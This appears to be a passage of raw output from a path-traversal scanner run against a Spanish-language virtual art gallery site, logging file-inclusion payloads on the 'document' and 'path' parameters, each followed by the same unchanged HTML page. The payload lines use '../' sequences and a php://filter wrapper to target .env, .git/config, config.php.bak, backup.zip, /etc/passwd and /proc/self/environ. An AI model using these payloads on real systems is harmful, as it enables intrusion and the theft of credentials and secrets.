            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: path
[payload] path=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
